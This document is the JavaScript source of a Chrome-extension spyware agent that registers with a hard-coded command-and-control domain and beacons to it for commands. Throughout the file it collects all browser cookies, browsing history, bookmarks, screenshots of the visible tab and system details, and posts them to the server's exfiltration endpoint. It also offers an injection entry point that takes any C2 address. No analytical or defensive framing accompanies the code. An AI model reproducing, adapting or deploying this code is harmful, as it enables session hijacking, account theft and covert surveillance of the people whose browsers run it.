const C2_SERVER = 'https://tradingpiecefororder.asia';
let agent_id = null;

// === Random Name Generator ===
function getRandomName() {
  const adjectives = ["silent", "red", "dark", "ghostly", "shadow"];
  const animals = ["fox", "eagle", "spider", "owl", "panther"];
  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
  const animal = animals[Math.floor(Math.random() * animals.length)];
  return `${adj}-${animal}-${Math.floor(Math.random() * 10000)}`;
}

// === Get Public IP ===
async function getPublicIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const data = await res.json();
    return data.ip || 'unknown';
  } catch (err) {
    console.warn('[GetIP] Failed:', err.message);
    return 'unknown';
  }
}

// === Retry wrapper ===
async function fetchWithRetry(url, options, retries = 3, delay = 3000) {
  for (let i = 0; i < retries; i++) {
    try {
      const res = await fetch(url, options);
      if (!res.ok) throw new Error(`Status: ${res.status}`);
      return res;
    } catch (err) {
      if (i < retries - 1) await new Promise(res => setTimeout(res, delay));
      else throw err;
    }
  }
}

// === Exfil ===
async function exfilData(action, payload) {
  try {
    const res = await fetchWithRetry(`${C2_SERVER}/api/exfil`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ agent_id, action, payload })
    });
    const result = await res.json();
    console.log(`[Exfil OK] ${action}:`, result);
  } catch (err) {
    console.error(`[Exfil FAIL] ${action}:`, err.message);
  }
}

// === Screenshot ===
async function captureScreenshot(quality = 50) {
  if (typeof chrome !== 'undefined' && chrome.tabs?.captureVisibleTab) {
    chrome.tabs.captureVisibleTab(null, { format: 'png', quality }, (dataUrl) => {
      if (chrome.runtime.lastError) {
        console.error('[Screenshot Error]', chrome.runtime.lastError);
        return;
      }
      const base64 = dataUrl.split(',')[1];
      exfilData('TAKE_SCREENSHOT', {
        agent_id,
        screenshot: base64,
        timestamp: new Date().toISOString()
      });
    });
  }
}

// === Bookmarks ===
async function getBookmarks() {
  if (typeof chrome !== 'undefined' && chrome.bookmarks?.getTree) {
    try {
      const tree = await new Promise(res => chrome.bookmarks.getTree(res));
      exfilData('BOOKMARKS', {
        bookmarks: tree[0],
        timestamp: new Date().toISOString()
      });
    } catch (err) {
      console.error('[Bookmarks Error]', err);
    }
  }
}

// === Cookies ===
async function getCookiesForDomain(domain = null) {
  if (typeof chrome !== 'undefined' && chrome.cookies?.getAll) {
    const options = domain ? { domain } : {};
    chrome.cookies.getAll(options, (cookies) => {
      const grouped = {};
      cookies.forEach(cookie => {
        if (!grouped[cookie.domain]) grouped[cookie.domain] = [];
        grouped[cookie.domain].push(cookie);
      });
      exfilData('COOKIES', { domain: domain || 'all', cookies: grouped });
    });
  }
}

// === History ===
async function getBrowsingHistory(days = 7) {
  if (typeof chrome !== 'undefined' && chrome.history?.search) {
    const since = Date.now() - (1000 * 60 * 60 * 24 * days);
    chrome.history.search({ text: '', startTime: since, maxResults: 5000 }, (items) => {
      const history = items.map(item => ({
        url: item.url,
        title: item.title,
        lastVisit: new Date(item.lastVisitTime).toISOString()
      }));
      exfilData('HISTORY', { days, entries: history });
    });
  }
}

// === System Info ===
async function sendSystemInfo() {
  const info = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenRes: `${screen.width}x${screen.height}`
  };
  exfilData('SYSTEM_INFO', info);
}

// === Handle Commands ===
async function handleCommand(cmd) {
  switch (cmd.type?.toLowerCase()) {
    case 'take_screenshot':
    case 'screenshot':
      console.log('[Handling Command] screenshot => captureScreenshot');
      await captureScreenshot(cmd.payload?.quality || 50);
      break;

    case 'getcookies':
      await getCookiesForDomain(cmd.payload?.domain || null);
      break;

    case 'bookmarks':
      await getBookmarks();
      break;

    case 'history':
      await getBrowsingHistory(cmd.payload?.days || 7);
      break;

    case 'sysinfo':
    case 'enumeration':
      await sendSystemInfo();
      break;

    default:
      console.warn('[Unknown CMD]', cmd);
  }
}

// === Beaconing ===
function getRandomInterval() {
  return Math.floor(Math.random() * 25 + 5) * 1000;
}

async function beaconToC2() {
  console.log(`[Beacon] Checking ${C2_SERVER}/api/commands`);
  try {
    const res = await fetchWithRetry(`${C2_SERVER}/api/commands?agent_id=${agent_id}`, { method: 'GET' });
    const cmds = await res.json();
    console.log(`[Beacon] ${cmds.length} commands received`);
    for (const cmd of cmds) await handleCommand(cmd);
  } catch (err) {
    console.error('[Beacon] Failed:', err.message);
  }
}

function scheduleNextBeacon() {
  const interval = getRandomInterval();
  console.log(`[Beacon] Next in ${interval / 1000}s`);
  setTimeout(async () => {
    await beaconToC2();
    scheduleNextBeacon();
  }, interval);
}

// === Agent Registration ===
async function registerAgent() {
  const ip = await getPublicIP();
  const name = getRandomName();
  try {
    const res = await fetchWithRetry(`${C2_SERVER}/session/new`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        agent_name: name,
        ip,
        timestamp: new Date().toISOString()
      })
    });
    const data = await res.json();
    agent_id = data.agent_id;
    console.log('[Agent] Registered:', agent_id);
    if (typeof chrome !== 'undefined' && chrome.storage?.local) {
      chrome.storage.local.set({ agent_id });
    }
    await sendSystemInfo();
    scheduleNextBeacon();
  } catch (err) {
    console.error('[Register] Failed:', err.message);
  }
}

// === Startup ===
if (typeof chrome !== 'undefined' && chrome.runtime?.onStartup) {
  chrome.runtime.onStartup.addListener(() => {
    chrome.storage.local.get('agent_id', (res) => {
      if (res.agent_id) {
        agent_id = res.agent_id;
        console.log('[Startup] agent_id restored:', agent_id);
        scheduleNextBeacon();
      } else {
        registerAgent();
      }
    });
  });
}

// === Messages ===
if (typeof chrome !== 'undefined' && chrome.runtime?.onMessage) {
  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === 'exfil') {
      exfilData(msg.action, {
        url: sender.url,
        location: msg.location,
        ...msg.data
      });
      sendResponse({ status: 'ok' });
    }
    return true;
  });
}

// === Injection Mode Entry ===
if (typeof window !== 'undefined') {
  window.run = async function(cfg) {
    console.log('[Injected] run() with cfg:', cfg);
    if (!cfg?.c2) return console.warn('[run] Missing cfg.c2');
    agent_id = null;
    Object.assign(window, { C2_SERVER: cfg.c2 });

    try {
      const res = await fetch(`${cfg.c2}/session/new`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ timestamp: new Date().toISOString() })
      });
      const data = await res.json();
      agent_id = data.agent_id;
      await sendSystemInfo();
      scheduleNextBeacon();
    } catch (err) {
      console.error('[Injected Register] Failed:', err.message);
    }
  };
}








